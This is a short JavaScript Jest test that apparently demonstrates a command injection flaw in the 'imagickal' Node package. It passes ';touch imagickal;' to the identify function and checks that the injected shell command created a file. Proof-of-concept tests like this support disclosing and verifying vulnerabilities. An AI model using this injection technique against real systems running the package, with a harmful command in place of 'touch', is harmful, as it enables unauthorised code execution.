test("Remote code execution in imagickal", () => {
  expect.assertions(2);
  const im = require("imagickal");
  const fs = require("fs");
  const path = "./imagickal";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return im
    .identify(";touch imagickal;")
    .catch((err) => {})
    .finally(() => {
      console.log("finally!");
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
